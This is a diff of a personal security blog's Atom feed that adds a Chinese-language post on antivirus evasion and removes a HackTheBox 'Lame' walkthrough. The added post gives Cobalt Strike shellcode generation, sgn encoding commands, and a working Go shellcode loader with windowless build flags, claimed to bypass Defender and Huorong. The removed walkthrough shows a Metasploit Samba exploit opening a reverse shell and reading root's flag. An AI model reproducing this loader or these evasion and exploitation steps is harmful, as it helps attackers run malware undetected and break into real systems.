@@ -1,4 +1,155 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-12T19:17:17+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">fastjson-1.2.24-RCE</title><link href="http://localhost:4000/exploit/fastjson/" rel="alternate" type="text/html" title="fastjson-1.2.24-RCE" /><published>2024-04-08T00:00:00+08:00</published><updated>2024-04-08T00:00:00+08:00</updated><id>http://localhost:4000/exploit/fastjson</id><content type="html" xml:base="http://localhost:4000/exploit/fastjson/"><![CDATA[<h1 id="fastjson-1224-rce">Fastjson-1.2.24-RCE</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-20T16:58:32+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">Shellcode加密</title><link href="http://localhost:4000/antivirus-evasion/shellcode/" rel="alternate" type="text/html" title="Shellcode加密" /><published>2024-11-20T00:00:00+08:00</published><updated>2024-11-20T00:00:00+08:00</updated><id>http://localhost:4000/antivirus-evasion/shellcode</id><content type="html" xml:base="http://localhost:4000/antivirus-evasion/shellcode/"><![CDATA[<h1 id="shellcode加密">Shellcode加密</h1>
+<h2 id="0x00-写在前面">0x00 写在前面</h2>
+<p>今年6月份辞掉了我那份摸鱼的工作，至今为止，已经找了快3个月的工作了，个人认为是如今的经济大环境差以及网络安全的发展迅速，导致了像我这样没有什么特长的web狗很难找到一份心仪的工作。</p>
+
+<p>不多bb了，关于免杀，网络上的教程还是比较多的，也是我比较感兴趣的内容，我目前的学习路线是：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 免杀知识（Shellcode加密、减少熵、反沙箱、导入表隐藏、etw和amsi修补、系统调用、unhook、白加黑、opsec杀人于无形、c2选择等）
+2. 把网络知识补上（Wireshark分析等）
+3. 进源渗透的一些思路
+4. 工具开发（Golang、Cobaltstrike插件开发等）
+5. 内网该会的都得会
+</code></pre></div></div>
+<h2 id="0x01-shellcode生成">0x01 Shellcode生成</h2>
+
+<p><img src="/images/antivirus/shellcode/1.jpg" alt="" /></p>
+
+<p>Shellcode是一段用于利用软件漏洞而执行的代码，Shellcode为16进制之机械码，以其经常让攻击者获得Shell而得名。用Cobaltstrike &gt; Payloads &gt; 可以分别生成有阶段和无阶段的Payload，输出格式选择Raw（原始二进制数据），即可生成一段我们所需要的Shellcode。那么Shellcode到底是二进制还是十六进制呢？本质上是二进制数据，十六进制只不过是二进制的另一种可视化形式。</p>
+
+<p>Stager和Stageless的区别是C4和导弹的区别，Stager小巧但容易被发现，Stageless可瞬爆但体积过大不利于传输</p>
+
+<h2 id="0x02-shellcode加密">0x02 Shellcode加密</h2>
+
+<p>Shellcode加密一般用sgn加密，Shikata ga nai日语是没有办法。需要先安装 keystone engine来作为依赖，可以用docker容器的方式直接跳过依赖库的安装。sgn加密后的Shellcode无需解密，可直接写入内存并执行，并且可以规避一切杀软的检测，这两个优点使sgn加密成为Shellcode加密最好的办法。也可以自己写脚本对Shellcode进行异或、求反、反转等一系列运算后再解密，达到了一定的混淆程度之后同样可以规避杀软。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker pull egee/sgn
+
+docker run -it -v /tmp/:/tmp/ egee/sgn -a 64 /tmp/shellcode
+</code></pre></div></div>
+
+<p>用以下小工具可以轻松提取shellcode的16进制数组：</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+<span class="c">//sctool by yueyejian</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"encoding/hex"</span>
+	<span class="s">"flag"</span>
+	<span class="s">"fmt"</span>
+	<span class="s">"io/ioutil"</span>
+	<span class="s">"strings"</span>
+<span class="p">)</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c">// 定义 -f 参数，用于指定文件名</span>
+	<span class="n">filename</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"f"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"Path to the binary file (e.g., payload.bin)"</span><span class="p">)</span>
+	<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>
+
+	<span class="c">// 检查是否提供了文件名</span>
+	<span class="k">if</span> <span class="o">*</span><span class="n">filename</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Error: No file specified. Use -f to specify the file path."</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="c">// 读取指定的二进制文件</span>
+	<span class="n">data</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ioutil</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="o">*</span><span class="n">filename</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Error reading file '%s': %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="c">// 1. 紧凑的十六进制字符串</span>
+	<span class="n">compactHex</span> <span class="o">:=</span> <span class="n">hex</span><span class="o">.</span><span class="n">EncodeToString</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+	<span class="c">// 2. C 风格转义字符串</span>
+	<span class="k">var</span> <span class="n">escapedHex</span> <span class="n">strings</span><span class="o">.</span><span class="n">Builder</span>
+	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">b</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">data</span> <span class="p">{</span>
+		<span class="n">escapedHex</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
+	<span class="p">}</span>
+
+	<span class="c">// 3. C 风格数组</span>
+	<span class="k">var</span> <span class="n">cArray</span> <span class="n">strings</span><span class="o">.</span><span class="n">Builder</span>
+	<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="s">"{"</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">data</span> <span class="p">{</span>
+		<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"0x%02x"</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
+		<span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="m">1</span> <span class="p">{</span>
+			<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="s">", "</span><span class="p">)</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="s">"}"</span><span class="p">)</span>
+
+	<span class="c">// 打印结果</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"紧凑的十六进制字符串:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">compactHex</span><span class="p">)</span>
+
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">C 风格转义字符串:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">escapedHex</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">C 风格数组:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[]byte"</span> <span class="o">+</span> <span class="n">cArray</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h2 id="0x03-shellcode-loader">0x03 Shellcode Loader</h2>
+<p>以下是一个用Go写的Shellcode加载器，结合上面的Shellcode加密可以轻松绕过Defender</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"syscall"</span>
+	<span class="s">"unsafe"</span>
+<span class="p">)</span>
+
+<span class="k">const</span> <span class="p">(</span>
+	<span class="n">MEM_COMMIT</span>             <span class="o">=</span> <span class="m">0x1000</span>
+	<span class="n">MEM_RESERVE</span>            <span class="o">=</span> <span class="m">0x2000</span>
+	<span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="m">0x40</span>
+<span class="p">)</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="p">(</span>
+		<span class="n">kernel32</span>      <span class="o">=</span> <span class="n">syscall</span><span class="o">.</span><span class="n">MustLoadDLL</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)</span>
+		<span class="n">VirtualAlloc</span>  <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"VirtualAlloc"</span><span class="p">)</span>
+		<span class="n">RtlCopyMemory</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"RtlCopyMemory"</span><span class="p">)</span>
+		<span class="n">shellcode_buf</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">{}</span>
+	<span class="p">)</span>
+	<span class="n">addr</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)),</span> <span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>
+	<span class="n">RtlCopyMemory</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr</span><span class="p">)(</span><span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode_buf</span><span class="p">[</span><span class="m">0</span><span class="p">])),</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)))</span>
+	<span class="n">syscall</span><span class="o">.</span><span class="n">Syscall</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>编译成可执行文件</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go build <span class="nt">-ldflags</span><span class="o">=</span><span class="s2">"-w -s -H windowsgui"</span> <span class="nt">-trimpath</span> main.go
+</code></pre></div></div>
+
+<h2 id="0x04-免杀某绒">0x04 免杀某绒</h2>
+<p>修改加载器代码</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"syscall"</span>
+	<span class="s">"unsafe"</span>
+<span class="p">)</span>
+
+<span class="k">const</span> <span class="p">(</span>
+	<span class="n">MEM_COMMIT</span>             <span class="o">=</span> <span class="m">0x1000</span>
+	<span class="n">MEM_RESERVE</span>            <span class="o">=</span> <span class="m">0x2000</span>
+	<span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="m">0x40</span>
+<span class="p">)</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="p">(</span>
+		<span class="n">kernel32</span>      <span class="o">=</span> <span class="n">syscall</span><span class="o">.</span><span class="n">MustLoadDLL</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)</span>
+		<span class="n">VirtualAlloc</span>  <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"VirtualAlloc"</span><span class="p">)</span>
+		<span class="n">RtlCopyMemory</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"RtlCopyMemory"</span><span class="p">)</span>
+		<span class="n">shellcode_buf</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">{}</span>
+	<span class="p">)</span>
+	<span class="n">addr</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>
+	<span class="n">RtlCopyMemory</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr</span><span class="p">)(</span><span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode_buf</span><span class="p">[</span><span class="m">0</span><span class="p">])),</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)))</span>
+	<span class="n">syscall</span><span class="o">.</span><span class="n">Syscall</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>可以过火绒静态检测，可以命令执行，但是会在安全日志下留下记录</p>]]></content><author><name>yueyejian</name></author><category term="[&quot;antivirus-evasion&quot;]" /><category term="golang" /><summary type="html"><![CDATA[Shellcode加密 0x00 写在前面 今年6月份辞掉了我那份摸鱼的工作，至今为止，已经找了快3个月的工作了，个人认为是如今的经济大环境差以及网络安全的发展迅速，导致了像我这样没有什么特长的web狗很难找到一份心仪的工作。]]></summary></entry><entry><title type="html">fastjson-1.2.24-RCE</title><link href="http://localhost:4000/exploit/fastjson/" rel="alternate" type="text/html" title="fastjson-1.2.24-RCE" /><published>2024-04-08T00:00:00+08:00</published><updated>2024-04-08T00:00:00+08:00</updated><id>http://localhost:4000/exploit/fastjson</id><content type="html" xml:base="http://localhost:4000/exploit/fastjson/"><![CDATA[<h1 id="fastjson-1224-rce">Fastjson-1.2.24-RCE</h1>
 <h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
 <p>fastjson是一个由阿里巴巴开发的Java库，用于处理json数据。fastjson在17年的1.2.24版本首次爆出了一个RCE漏洞，原理是<code class="language-plaintext highlighter-rouge">jndi注入</code>。很快阿里发布了新的版本1.2.25，通过<code class="language-plaintext highlighter-rouge">checkAutoType()</code>这个函数来防御这个漏洞。</p>
 
@@ -938,214 +1089,4 @@ uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip
 
 <ul>
   <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd-Privilege-Escalation</a></li>
-</ul>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="smtp" /><category term="vigenere" /><category term="ssh" /><category term="privilege-escalation" /><summary type="html"><![CDATA[HackTheBox - Brainfuck About Brainfuck Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.]]></summary></entry><entry><title type="html">HackTheBox - Lame</title><link href="http://localhost:4000/hack-the-box/lame/" rel="alternate" type="text/html" title="HackTheBox - Lame" /><published>2023-04-22T00:00:00+08:00</published><updated>2023-04-22T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/lame</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lame/"><![CDATA[<h1 id="hackthebox---lame">HackTheBox - Lame</h1>
-<h2 id="about-lame">About Lame</h2>
-<p>Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.</p>
-
-<p><img src="/images/hackthebox/lame/0.png" alt="" /></p>
-
-<h2 id="nmap">Nmap</h2>
-<p>扫一下端口</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/lame]
-└─$ cat nmap.txt
-# Nmap 7.93 scan initiated Sat Apr 22 00:01:10 2023 as: nmap -n -v -sC -sV -oN nmap.txt -Pn 10.10.10.3
-Nmap scan report for 10.10.10.3
-Host is up (0.55s latency).
-Not shown: 996 filtered tcp ports (no-response)
-PORT    STATE SERVICE      VERSION
-21/tcp  open  ftp          vsftpd 2.3.4
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to 10.10.14.4
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      vsFTPd 2.3.4 - secure, fast, stable
-|_End of status
-22/tcp  open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
-|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
-139/tcp open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  microsoft-ds Samba smbd 3.0.20-Debian
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: mean: 2h00m22s, deviation: 2h49m45s, median: 20s
-| smb-os-discovery: 
-|   OS: Unix (Samba 3.0.20-Debian)
-|   Computer name: lame
-|   NetBIOS computer name: 
-|   Domain name: hackthebox.gr
-|   FQDN: lame.hackthebox.gr
-|_  System time: 2023-04-22T00:05:32-04:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_smb2-time: Protocol negotiation failed (SMB2)
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sat Apr 22 00:05:54 2023 -- 1 IP address (1 host up) scanned in 284.48 seconds                                                                                                                                                   
-</code></pre></div></div>
-<h2 id="msf">MSF</h2>
-<p>查询相关漏洞，发现第三行的<code class="language-plaintext highlighter-rouge">'Username map script' Command Execution (Metasploit)</code>可用，而且是metasploit里面的攻击模块</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/lame]
-└─$ searchsploit samba 3.0
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                           |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                     | osx/remote/16875.rb
-Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                                                   | multiple/remote/10095.txt
-Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                         | unix/remote/16320.rb
-Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                       | linux/remote/9950.rb
-Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                   | linux/remote/16859.rb
-Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                 | solaris/remote/16329.rb
-Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                 | linux/dos/4732.c
-Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                        | multiple/dos/5712.pl
-Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                         | linux/remote/364.pl
-Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                    | linux/remote/7701.txt
-Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                            | linux_x86/dos/36741.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-</code></pre></div></div>
-
-<p>直接用metasploit搜索<code class="language-plaintext highlighter-rouge">Samba 3.0.20</code></p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search samba 3.0.20
-
-Matching Modules
-<span class="o">================</span>
-
-   <span class="c">#  Name                                Disclosure Date  Rank       Check  Description</span>
-   -  <span class="nt">----</span>                                <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
-   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No    
-</code></pre></div></div>
-<p>选择此模块并配置好反弹shell的相关参数，用<code class="language-plaintext highlighter-rouge">run</code>命令发起攻击，直接获取了root权限下的shell，直接打开root下的flag</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
-msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> show option
-<span class="o">[</span>-] Invalid parameter <span class="s2">"option"</span>, use <span class="s2">"show -h"</span> <span class="k">for </span>more information
-msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> show options
-
-Module options <span class="o">(</span>exploit/multi/samba/usermap_script<span class="o">)</span>:
-
-   Name    Current Setting  Required  Description
-   <span class="nt">----</span>    <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
-   RHOSTS                   <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT   139              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
-
-
-Payload options <span class="o">(</span>cmd/unix/reverse_netcat<span class="o">)</span>:
-
-   Name   Current Setting  Required  Description
-   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
-   LHOST  192.168.32.134   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
-   LPORT  4444             <span class="nb">yes       </span>The listen port
-
-
-Exploit target:
-
-   Id  Name
-   <span class="nt">--</span>  <span class="nt">----</span>
-   0   Automatic
-
-
-
-View the full module info with the info, or info <span class="nt">-d</span> command.
-
-msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost 10.10.10.3
-rhost <span class="o">=&gt;</span> 10.10.10.3
-msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rport 445
-rport <span class="o">=&gt;</span> 445
-msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 10.10.14.4
-lhost <span class="o">=&gt;</span> 10.10.14.4
-msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 2333
-lport <span class="o">=&gt;</span> 2333
-msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> run
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.4:2333 
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.4:2333 -&gt; 10.10.10.3:40919<span class="o">)</span> at 2023-04-22 00:22:42 <span class="nt">-0400</span>
-<span class="nb">whoami
-</span>root
-which python
-/usr/bin/python
-python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
-root@lame:/# <span class="nb">cat</span> /root/root.txt
-<span class="nb">cat</span> /root/root.txt
-162190c25286540dea9c0047e......
-</code></pre></div></div>
-<p>user下的flag</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lame:/home# find / <span class="nt">-name</span> user.txt 2&gt;/dev/null
-find / <span class="nt">-name</span> user.txt 2&gt;/dev/null
-/home/makis/user.txt
-root@lame:/home# <span class="nb">cat</span> /makis/user.txt
-<span class="nb">cat</span> /makis/user.txt
-<span class="nb">cat</span>: /makis/user.txt: No such file or directory
-root@lame:/home# <span class="nb">cat </span>makis/user.txt
-<span class="nb">cat </span>makis/user.txt
-a5ceb51f1741b774fbee61a559......
-</code></pre></div></div>
-<h2 id="cve-2007-2447">CVE-2007-2447</h2>
-<p>用show info查看模块信息，可以看到漏洞编号是CVE-2007-2447</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit(multi/samba/usermap_script) &gt; show info
-
-       Name: Samba "username map script" Command Execution
-     Module: exploit/multi/samba/usermap_script
-   Platform: Unix
-       Arch: cmd
- Privileged: Yes
-    License: Metasploit Framework License (BSD)
-       Rank: Excellent
-  Disclosed: 2007-05-14
-
-Provided by:
-  jduck &lt;jduck@metasploit.com&gt;
-
-Available targets:
-      Id  Name
-      --  ----
-  =&gt;  0   Automatic
-
-Check supported:
-  No
-
-Basic options:
-  Name    Current Setting  Required  Description
-  ----    ---------------  --------  -----------
-  RHOSTS  10.10.10.3       yes       The target host(s), see https://docs.
-                                     metasploit.com/docs/using-metasploit/
-                                     basics/using-metasploit.html
-  RPORT   445              yes       The target port (TCP)
-
-Payload information:
-  Space: 1024
-
-Description:
-  This module exploits a command execution vulnerability in Samba 
-  versions 3.0.20 through 3.0.25rc3 when using the non-default 
-  "username map script" configuration option. By specifying a username 
-  containing shell meta characters, attackers can execute arbitrary 
-  commands. No authentication is needed to exploit this vulnerability 
-  since this option is used to map usernames prior to authentication!
-
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
-  OSVDB (34700)
-  http://www.securityfocus.com/bid/23972
-  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
-  http://samba.org/samba/security/CVE-2007-2447.html
-
-
-View the full module info with the info -d command.
-
-</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="linux" /><category term="msf" /><category term="samba" /><category term="rce" /><category term="smb" /><summary type="html"><![CDATA[HackTheBox - Lame About Lame Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.]]></summary></entry></feed>
+</ul>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="smtp" /><category term="vigenere" /><category term="ssh" /><category term="privilege-escalation" /><summary type="html"><![CDATA[HackTheBox - Brainfuck About Brainfuck Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.]]></summary></entry></feed>
